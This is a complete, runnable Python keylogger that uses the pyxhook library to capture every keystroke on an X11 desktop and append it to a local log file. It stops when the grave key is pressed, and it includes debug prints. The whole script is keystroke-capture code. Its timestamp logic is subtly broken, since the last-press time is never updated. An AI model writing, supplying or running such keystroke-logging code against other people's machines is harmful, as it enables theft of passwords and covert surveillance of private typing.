#!/usr/bin/env python3

import pyxhook

from datetime import datetime, timedelta

#change this to your log file's path
log_file='./file.log'
global last_time
last_time = datetime.now()

#this function is called everytime a key is pressed.
def OnKeyPress(event):
  time_now = datetime.now()
  local_last_time = last_time
  fob=open(log_file,'a')

  if len(event.Key) > 1:
    fob.write('\n')

  print("time_now: " + time_now.strftime("%B %d, %Y"))
  print("last_time: " + local_last_time.strftime("%B %d, %Y"))

  try:
    if (time_now - local_last_time) > timedelta(seconds=1):
      fob.write('\n')
    else:
      print("ni")
  except UnboundLocalError:
    print("Unbound")

  local_last_time = time_now
  if event.Key == "space":
    print("you pressed space")
    fob.write(" ")
  else:
    fob.write(event.Key)
  if event.Ascii==96: #96 is the ascii value of the grave key (`)
    fob.close()
    new_hook.cancel()


#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()
